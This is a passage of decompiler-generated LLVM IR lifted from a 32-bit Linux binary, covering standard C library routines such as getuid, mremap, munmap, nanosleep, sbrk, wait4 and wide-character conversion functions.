dec_label_pc_8054c64:                             ; preds = %entry
  %v0_8054c64 = load i32, i32* %stack_var_-4, align 4
  %v1_8054c64 = call i32 @__errno_location(i32 %v0_8054c64)
  %v0_8054c69 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054c69 = sub i32 0, %v0_8054c69
  %v2_8054c6b = inttoptr i32 %v1_8054c64 to i32*
  store i32 %v1_8054c69, i32* %v2_8054c6b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054c70

dec_label_pc_8054c70:                             ; preds = %entry, %dec_label_pc_8054c64
  %v0_8054c70 = phi i32 [ %v1_8054c59, %entry ], [ -1, %dec_label_pc_8054c64 ]
  %v2_8054c74 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054c74, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054c70

; uselistorder directives
  uselistorder i32 %v1_8054c59, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054c70, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054c78 = load i32, i32* @ebx, align 4
  store i32 %v0_8054c78, i32* %stack_var_-4, align 4
  %v1_8054c81 = call i32 @int80_syscall(i32 199)
  store i32 %v1_8054c81, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8054c81, -4095
  br i1 %tmp6, label %dec_label_pc_8054c98, label %dec_label_pc_8054c8c

dec_label_pc_8054c8c:                             ; preds = %entry
  %v0_8054c8c = load i32, i32* %stack_var_-4, align 4
  %v1_8054c8c = call i32 @__errno_location(i32 %v0_8054c8c)
  %v0_8054c91 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054c91 = sub i32 0, %v0_8054c91
  %v2_8054c93 = inttoptr i32 %v1_8054c8c to i32*
  store i32 %v1_8054c91, i32* %v2_8054c93, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054c98

dec_label_pc_8054c98:                             ; preds = %entry, %dec_label_pc_8054c8c
  %v0_8054c98 = phi i32 [ %v1_8054c81, %entry ], [ -1, %dec_label_pc_8054c8c ]
  %v2_8054c9c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054c9c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054c98

; uselistorder directives
  uselistorder i32 %v1_8054c81, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 199, { 1, 0 }
  uselistorder label %dec_label_pc_8054c98, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8054ca0 = load i32, i32* @edi, align 4
  %v0_8054ca1 = load i32, i32* @esi, align 4
  store i32 %v0_8054ca1, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_8054cb9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_8054cc1 = call i32 @mremap(i32 %v0_8054cb9, i32 %v0_8054ca1, i32 %v0_8054ca0, i32 %tmp6, i32 %arg1, i32 %arg2)
  store i32 %v0_8054cb9, i32* @ebx, align 4
  store i32 %v6_8054cc1, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v6_8054cc1, -4095
  br i1 %tmp11, label %dec_label_pc_8054cd9, label %dec_label_pc_8054ccd

dec_label_pc_8054ccd:                             ; preds = %entry
  %v1_8054ccd = call i32 @__errno_location(i32 %v0_8054cb9)
  %v0_8054cd2 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054cd2 = sub i32 0, %v0_8054cd2
  %v2_8054cd4 = inttoptr i32 %v1_8054ccd to i32*
  store i32 %v1_8054cd2, i32* %v2_8054cd4, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054cd9

dec_label_pc_8054cd9:                             ; preds = %entry, %dec_label_pc_8054ccd
  %v0_8054cd9 = phi i32 [ %v6_8054cc1, %entry ], [ -1, %dec_label_pc_8054ccd ]
  %v2_8054cdb = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054cdb, i32* @edx, align 4
  %v2_8054cdc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8054cdc, i32* @esi, align 4
  store i32 %v0_8054ca0, i32* @edi, align 4
  ret i32 %v0_8054cd9

; uselistorder directives
  uselistorder i32 %v6_8054cc1, { 1, 0, 2 }
  uselistorder i32 %v0_8054cb9, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mremap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054cd9, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054ce0 = load i32, i32* @ebx, align 4
  store i32 %v0_8054ce0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8054cf3 = call i32 @munmap(i32 %v0_8054ce0, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_8054cf3, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v4_8054cf3, -4095
  br i1 %tmp8, label %dec_label_pc_8054d0c, label %dec_label_pc_8054d00

dec_label_pc_8054d00:                             ; preds = %entry
  %v0_8054d00 = load i32, i32* %stack_var_-4, align 4
  %v1_8054d00 = call i32 @__errno_location(i32 %v0_8054d00)
  %v0_8054d05 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054d05 = sub i32 0, %v0_8054d05
  %v2_8054d07 = inttoptr i32 %v1_8054d00 to i32*
  store i32 %v1_8054d05, i32* %v2_8054d07, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054d0c

dec_label_pc_8054d0c:                             ; preds = %entry, %dec_label_pc_8054d00
  %v0_8054d0c = phi i32 [ %v4_8054cf3, %entry ], [ -1, %dec_label_pc_8054d00 ]
  %v2_8054d0e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054d0e, i32* @edx, align 4
  %v2_8054d10 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054d10, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054d0c

; uselistorder directives
  uselistorder i32 %v4_8054cf3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054d0c, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054d14 = load i32, i32* @ebx, align 4
  store i32 %v0_8054d14, i32* %stack_var_-4, align 4
  %v4_8054d18 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_8054d18, i32* %ebx.global-to-local, align 4
  %v6_8054d27 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_8054d27, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v6_8054d27, -4095
  br i1 %tmp10, label %dec_label_pc_8054d40, label %dec_label_pc_8054d34

dec_label_pc_8054d34:                             ; preds = %entry
  %v0_8054d34 = load i32, i32* %stack_var_-4, align 4
  %v1_8054d34 = call i32 @__errno_location(i32 %v0_8054d34)
  %v0_8054d39 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054d39 = sub i32 0, %v0_8054d39
  %v2_8054d3b = inttoptr i32 %v1_8054d34 to i32*
  store i32 %v1_8054d39, i32* %v2_8054d3b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054d40

dec_label_pc_8054d40:                             ; preds = %entry, %dec_label_pc_8054d34
  %v0_8054d40 = phi i32 [ %v6_8054d27, %entry ], [ -1, %dec_label_pc_8054d34 ]
  %v2_8054d42 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054d42, i32* @edx, align 4
  %v2_8054d44 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054d44, i32* @ebx, align 4
  ret i32 %v0_8054d40

; uselistorder directives
  uselistorder i32 %v6_8054d27, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054d40, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8054d49 = load i32, i32* @ebx, align 4
  %v0_8054d4d = load i32, i32* @global_var_80617a4.548, align 4
  %v1_8054d4d = icmp eq i32 %v0_8054d4d, 0
  %v1_8054d58 = icmp eq i1 %v1_8054d4d, false
  br i1 %v1_8054d58, label %dec_label_pc_8054d6b, label %dec_label_pc_8054d5a

dec_label_pc_8054d5a:                             ; preds = %entry
  %v1_8054d5f = call i32 @__GI_brk(i32 0)
  %v2_8054d67 = icmp slt i32 %v1_8054d5f, 0
  br i1 %v2_8054d67, label %dec_label_pc_8054d8d, label %dec_label_pc_8054d5a.dec_label_pc_8054d6b_crit_edge

dec_label_pc_8054d5a.dec_label_pc_8054d6b_crit_edge: ; preds = %dec_label_pc_8054d5a
  %v0_8054d6d.pre = load i32, i32* @global_var_80617a4.548, align 4
  br label %dec_label_pc_8054d6b

dec_label_pc_8054d6b:                             ; preds = %dec_label_pc_8054d5a.dec_label_pc_8054d6b_crit_edge, %entry
  %v0_8054d7b = phi i32 [ %v0_8054d6d.pre, %dec_label_pc_8054d5a.dec_label_pc_8054d6b_crit_edge ], [ %v0_8054d4d, %entry ]
  %v1_8054d6b = icmp eq i32 %arg1, 0
  %v1_8054d72 = icmp eq i1 %v1_8054d6b, false
  br i1 %v1_8054d72, label %dec_label_pc_8054d78, label %dec_label_pc_8054d74

dec_label_pc_8054d74:                             ; preds = %dec_label_pc_8054d6b
  br label %dec_label_pc_8054d90

dec_label_pc_8054d78:                             ; preds = %dec_label_pc_8054d6b
  store i32 %v0_8054d7b, i32* @ebx, align 4
  %v2_8054d7d = add i32 %v0_8054d7b, %arg1
  %v1_8054d81 = call i32 @__GI_brk(i32 %v2_8054d7d)
  %v2_8054d89 = icmp slt i32 %v1_8054d81, 0
  %v1_8054d8b = icmp eq i1 %v2_8054d89, false
  br i1 %v1_8054d8b, label %dec_label_pc_8054d78.dec_label_pc_8054d90_crit_edge, label %dec_label_pc_8054d8d

dec_label_pc_8054d78.dec_label_pc_8054d90_crit_edge: ; preds = %dec_label_pc_8054d78
  %v0_8054d90.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8054d90

dec_label_pc_8054d8d:                             ; preds = %dec_label_pc_8054d78, %dec_label_pc_8054d5a
  br label %dec_label_pc_8054d90

dec_label_pc_8054d90:                             ; preds = %dec_label_pc_8054d78.dec_label_pc_8054d90_crit_edge, %dec_label_pc_8054d74, %dec_label_pc_8054d8d
  %v0_8054d90 = phi i32 [ %v0_8054d90.pre, %dec_label_pc_8054d78.dec_label_pc_8054d90_crit_edge ], [ %v0_8054d7b, %dec_label_pc_8054d74 ], [ -1, %dec_label_pc_8054d8d ]
  %v2_8054d92 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054d92, i32* @edx, align 4
  store i32 %v0_8054d49, i32* @ebx, align 4
  ret i32 %v0_8054d90

; uselistorder directives
  uselistorder i32 %v0_8054d7b, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_8054d90, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8054d98 = load i32, i32* @edi, align 4
  %v0_8054d99 = load i32, i32* @esi, align 4
  store i32 %v0_8054d99, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_8054dad = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8054db5 = call i32 @wait4(i32 %v0_8054dad, i32 %v0_8054d99, i32 %v0_8054d98, i32 %tmp5)
  store i32 %v0_8054dad, i32* @ebx, align 4
  store i32 %v4_8054db5, i32* %esi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_8054db5, -4095
  br i1 %tmp10, label %dec_label_pc_8054dcd, label %dec_label_pc_8054dc1

dec_label_pc_8054dc1:                             ; preds = %entry
  %v1_8054dc1 = call i32 @__errno_location(i32 %v0_8054dad)
  %v0_8054dc6 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054dc6 = sub i32 0, %v0_8054dc6
  %v2_8054dc8 = inttoptr i32 %v1_8054dc1 to i32*
  store i32 %v1_8054dc6, i32* %v2_8054dc8, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054dcd

dec_label_pc_8054dcd:                             ; preds = %entry, %dec_label_pc_8054dc1
  %v0_8054dcd = phi i32 [ %v4_8054db5, %entry ], [ -1, %dec_label_pc_8054dc1 ]
  %v2_8054dcf = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054dcf, i32* @edx, align 4
  %v2_8054dd0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8054dd0, i32* @esi, align 4
  store i32 %v0_8054d98, i32* @edi, align 4
  ret i32 %v0_8054dcd

; uselistorder directives
  uselistorder i32 %v4_8054db5, { 1, 0, 2 }
  uselistorder i32 %v0_8054dad, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054dcd, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_8061784.549 to i32)
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_8054de7 = icmp eq i32 %tmp5, 0
  %v1_8054de9 = icmp eq i1 %v1_8054de7, false
  br i1 %v1_8054de9, label %dec_label_pc_8054df1, label %dec_label_pc_8054deb

dec_label_pc_8054deb:                             ; preds = %entry
  %v2_8054deb = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_8054df1

dec_label_pc_8054df1:                             ; preds = %entry, %dec_label_pc_8054deb
  %v0_8054e0d = phi i32 [ %tmp5, %entry ], [ %v2_8054deb, %dec_label_pc_8054deb ]
  %v0_8054df5 = phi i32 [ %tmp4, %entry ], [ 0, %dec_label_pc_8054deb ]
  %v2_8054df1 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v0_8054df5, i32* %stack_var_-4, align 4
  store i32 %v2_8054df1, i32* %stack_var_-8, align 4
  %v2_8054e08 = ptrtoint i32* %stack_var_-8 to i32
  %v5_8054e0e = inttoptr i32 %v0_8054e0d to i8*
  %v6_8054e0e = call i32 @__GI_wcsnrtombs(i8* %v5_8054e0e, i32 %v2_8054e08, i32 1, i32 16, i32 %tmp)
  %v1_8054e16 = icmp eq i32 %v6_8054e0e, 0
  %v1_8054e18 = icmp eq i1 %v1_8054e16, false
  br i1 %v1_8054e18, label %dec_label_pc_8054e1c, label %dec_label_pc_8054e1a

dec_label_pc_8054e1a:                             ; preds = %dec_label_pc_8054df1
  %v1_8054e1a = and i32 %v6_8054e0e, -256
  %v2_8054e1a = or i32 %v1_8054e1a, 1
  br label %dec_label_pc_8054e1c

dec_label_pc_8054e1c:                             ; preds = %dec_label_pc_8054df1, %dec_label_pc_8054e1a
  %v0_8054e1f = phi i32 [ %v6_8054e0e, %dec_label_pc_8054df1 ], [ %v2_8054e1a, %dec_label_pc_8054e1a ]
  ret i32 %v0_8054e1f

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_8054e1c, { 1, 0 }
  uselistorder label %dec_label_pc_8054df1, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_8054e35 = inttoptr i32 %tmp to i8*
  %v6_8054e35 = call i32 @__GI_wcsnrtombs(i8* %v5_8054e35, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_8054e35
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8054e43 = load i32, i32* @ebx, align 4
  %v4_8054e47 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054e47, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  %v1_8054e53 = icmp eq i8* %arg1, null
  br i1 %v1_8054e53, label %dec_label_pc_8054e87.thread, label %dec_label_pc_8054e57

dec_label_pc_8054e57:                             ; preds = %entry
  store i32 1, i32* %edi.global-to-local, align 4
  %v12_8054e5c = icmp eq i32 %v4_8054e47, %arg2
  %v1_8054e5e = icmp eq i1 %v12_8054e5c, false
  br i1 %v1_8054e5e, label %dec_label_pc_8054e87, label %dec_label_pc_8054e81

dec_label_pc_8054e87.thread:                      ; preds = %entry
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8054e64 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8054e64, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054e91

dec_label_pc_8054e6d:                             ; preds = %dec_label_pc_8054e98
  %v1_8054e6d = call i32 @__errno_location(i32 %v0_8054e43)
  store i32 %v1_8054e6d, i32* %eax.global-to-local, align 4
  %v1_8054e72 = inttoptr i32 %v1_8054e6d to i32*
  store i32 84, i32* %v1_8054e72, align 4
  br label %dec_label_pc_8054ebe

dec_label_pc_8054e7d:                             ; preds = %dec_label_pc_8054e9f
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_8054eb3.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054eaf

dec_label_pc_8054e81:                             ; preds = %dec_label_pc_8054e57
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8054e83 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8054e83, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054e87

dec_label_pc_8054e87:                             ; preds = %dec_label_pc_8054e57, %dec_label_pc_8054e81
  %v2_8054e9f15 = phi i32 [ %v4_8054e47, %dec_label_pc_8054e57 ], [ %v2_8054e83, %dec_label_pc_8054e81 ]
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %tmp33 = icmp ult i32 %arg4, %arg3
  br i1 %tmp33, label %dec_label_pc_8054e8f, label %dec_label_pc_8054e91

dec_label_pc_8054e8f:                             ; preds = %dec_label_pc_8054e87
  store i32 %arg4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054e91

dec_label_pc_8054e91:                             ; preds = %dec_label_pc_8054e87.thread, %dec_label_pc_8054e87, %dec_label_pc_8054e8f
  %v2_8054e9f1532 = phi i32 [ %v2_8054e9f15, %dec_label_pc_8054e87 ], [ %v2_8054e9f15, %dec_label_pc_8054e8f ], [ %v2_8054e64, %dec_label_pc_8054e87.thread ]
  %v0_8054e94 = phi i32 [ %arg3, %dec_label_pc_8054e87 ], [ %arg4, %dec_label_pc_8054e8f ], [ %arg3, %dec_label_pc_8054e87.thread ]
  %v1_8054e91 = inttoptr i32 %arg2 to i32*
  %v2_8054e91 = load i32, i32* %v1_8054e91, align 4
  store i32 %v2_8054e91, i32* %esi.global-to-local, align 4
  store i32 %v0_8054e94, i32* @ecx, align 4
  %v1_8054eab3 = icmp eq i32 %v0_8054e94, 0
  %v1_8054ead10 = icmp eq i1 %v1_8054eab3, false
  br i1 %v1_8054ead10, label %dec_label_pc_8054e98, label %dec_label_pc_8054eaf

dec_label_pc_8054e98:                             ; preds = %dec_label_pc_8054e91, %dec_label_pc_8054ea5
  %v2_8054e9f = phi i32 [ %v2_8054ea8, %dec_label_pc_8054ea5 ], [ %v2_8054e9f1532, %dec_label_pc_8054e91 ]
  %v0_8054e98 = phi i32 [ %v1_8054ea5, %dec_label_pc_8054ea5 ], [ %v2_8054e91, %dec_label_pc_8054e91 ]
  %v1_8054e98 = inttoptr i32 %v0_8054e98 to i32*
  %v2_8054e98 = load i32, i32* %v1_8054e98, align 4
  store i32 %v2_8054e98, i32* %eax.global-to-local, align 4
  %v6_8054e9d = icmp ugt i32 %v2_8054e98, 127
  br i1 %v6_8054e9d, label %dec_label_pc_8054e6d, label %dec_label_pc_8054e9f

dec_label_pc_8054e9f:                             ; preds = %dec_label_pc_8054e98
  %v1_8054e9f = trunc i32 %v2_8054e98 to i8
  %v3_8054e9f = inttoptr i32 %v2_8054e9f to i8*
  store i8 %v1_8054e9f, i8* %v3_8054e9f, align 1
  %v0_8054ea1 = load i32, i32* %eax.global-to-local, align 4
  %v3_8054ea1 = trunc i32 %v0_8054ea1 to i8
  %v4_8054ea1 = icmp eq i8 %v3_8054ea1, 0
  br i1 %v4_8054ea1, label %dec_label_pc_8054e7d, label %dec_label_pc_8054ea5

dec_label_pc_8054ea5:                             ; preds = %dec_label_pc_8054e9f
  %v0_8054ea5 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054ea5 = add i32 %v0_8054ea5, 4
  store i32 %v1_8054ea5, i32* %esi.global-to-local, align 4
  %v0_8054ea8 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054ea8 = load i32, i32* %edi.global-to-local, align 4
  %v2_8054ea8 = add i32 %v1_8054ea8, %v0_8054ea8
  store i32 %v2_8054ea8, i32* %edx.global-to-local, align 4
  %v0_8054eaa = load i32, i32* @ecx, align 4
  %v1_8054eaa = add i32 %v0_8054eaa, -1
  %v8_8054eaa = icmp eq i32 %v1_8054eaa, 0
  store i32 %v1_8054eaa, i32* @ecx, align 4
  %v1_8054ead = icmp eq i1 %v8_8054eaa, false
  br i1 %v1_8054ead, label %dec_label_pc_8054e98, label %dec_label_pc_8054eaf

dec_label_pc_8054eaf:                             ; preds = %dec_label_pc_8054ea5, %dec_label_pc_8054e91, %dec_label_pc_8054e7d
  %v0_8054eb7 = phi i32 [ 0, %dec_label_pc_8054e7d ], [ %v2_8054e91, %dec_label_pc_8054e91 ], [ %v1_8054ea5, %dec_label_pc_8054ea5 ]
  %v0_8054eb3 = phi i32 [ %v0_8054eb3.pre, %dec_label_pc_8054e7d ], [ %v2_8054e9f1532, %dec_label_pc_8054e91 ], [ %v2_8054ea8, %dec_label_pc_8054ea5 ]
  %v2_8054eaf = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8054eaf, i32* %eax.global-to-local, align 4
  %v12_8054eb3 = icmp eq i32 %v0_8054eb3, %v2_8054eaf
  br i1 %v12_8054eb3, label %dec_label_pc_8054eba, label %dec_label_pc_8054eb7

dec_label_pc_8054eb7:                             ; preds = %dec_label_pc_8054eaf
  %v1_8054eb7 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054eb7 = inttoptr i32 %v1_8054eb7 to i32*
  store i32 %v0_8054eb7, i32* %v2_8054eb7, align 4
  br label %dec_label_pc_8054eba

dec_label_pc_8054eba:                             ; preds = %dec_label_pc_8054eaf, %dec_label_pc_8054eb7
  %v0_8054eba = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8054eba, i32* %eax.global-to-local, align 4
  %v1_8054ebc = load i32, i32* @ecx, align 4
  %v2_8054ebc = sub i32 %v0_8054eba, %v1_8054ebc
  br label %dec_label_pc_8054ebe

dec_label_pc_8054ebe:                             ; preds = %dec_label_pc_8054e6d, %dec_label_pc_8054eba
  %storemerge1 = phi i32 [ %v2_8054ebc, %dec_label_pc_8054eba ], [ -1, %dec_label_pc_8054e6d ]
  store i32 %storemerge1, i32* %eax.global-to-local, align 4
  store i32 %v0_8054e43, i32* @ebx, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v2_8054ea8, { 0, 2, 1 }
  uselistorder i32 %v1_8054ea5, { 0, 2, 1 }
  uselistorder i32 %v2_8054e91, { 1, 0, 2 }
  uselistorder i32 %v0_8054e94, { 1, 0 }
  uselistorder i32 %v2_8054e9f1532, { 1, 0 }
  uselistorder i32 %v4_8054e47, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32* %edi.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 6, 5, 7 }
  uselistorder i32 127, { 2, 1, 6, 3, 4, 7, 0, 5 }
  uselistorder i32 %arg4, { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 1, 3, 4, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054ebe, { 1, 0 }
  uselistorder label %dec_label_pc_8054eba, { 1, 0 }
  uselistorder label %dec_label_pc_8054e98, { 1, 0 }
  uselistorder label %dec_label_pc_8054e91, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054e87, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8054ec9 = load i32, i32* @edi, align 4
  %v0_8054ecb = load i32, i32* @ebx, align 4
  %v4_8054ecf = ptrtoint i16* %arg1 to i32
  store i32 %v4_8054ecf, i32* @edi, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_8054edb5 = icmp eq i32 %arg3, 0
  br i1 %v1_8054edb5, label %dec_label_pc_8054f3a, label %dec_label_pc_8054ee0.lr.ph

dec_label_pc_8054ee0.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8054ee0

dec_label_pc_8054ee0:                             ; preds = %dec_label_pc_8054eff.dec_label_pc_8054ee0_crit_edge, %dec_label_pc_8054ee0.lr.ph
  %v0_8054ef0 = phi i32 [ %v4_8054ecf, %dec_label_pc_8054ee0.lr.ph ], [ %v0_8054ef0.pre, %dec_label_pc_8054eff.dec_label_pc_8054ee0_crit_edge ]
  %v0_8054eef = phi i32 [ %arg2, %dec_label_pc_8054ee0.lr.ph ], [ %v2_8054f01, %dec_label_pc_8054eff.dec_label_pc_8054ee0_crit_edge ]
  %v0_8054ee2.in = phi i32 [ %arg3, %dec_label_pc_8054ee0.lr.ph ], [ %v2_8054eff, %dec_label_pc_8054eff.dec_label_pc_8054ee0_crit_edge ]
  %v0_8054ee2 = icmp slt i32 %v0_8054ee2.in, 0
  store i32 %v0_8054ee2.in, i32* %ebp.global-to-local, align 4
  %v2_8054ee2 = icmp eq i1 %v0_8054ee2, false
  %storemerge = select i1 %v2_8054ee2, i32 %v0_8054ee2.in, i32 2147483647
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8054ef0 = add i32 %v0_8054ef0, 4
  %v2_8054ef0 = inttoptr i32 %v1_8054ef0 to i32*
  %v3_8054ef0 = load i32, i32* %v2_8054ef0, align 4
  %tmp37 = inttoptr i32 %v0_8054eef to i32*
  %v5_8054ef3 = call i32 @__libc_write(i32 %v3_8054ef0, i32* %tmp37, i32 %storemerge)
  store i32 %v5_8054ef3, i32* %eax.global-to-local, align 4
  %v2_8054efb = icmp slt i32 %v5_8054ef3, 0
  br i1 %v2_8054efb, label %dec_label_pc_8054f05, label %dec_label_pc_8054eff

dec_label_pc_8054eff:                             ; preds = %dec_label_pc_8054ee0
  %v0_8054eff = load i32, i32* @ebx, align 4
  %v2_8054eff = sub i32 %v0_8054eff, %v5_8054ef3
  %v12_8054eff = icmp eq i32 %v2_8054eff, 0
  store i32 %v2_8054eff, i32* @ebx, align 4
  %v0_8054f01 = load i32, i32* %esi.global-to-local, align 4
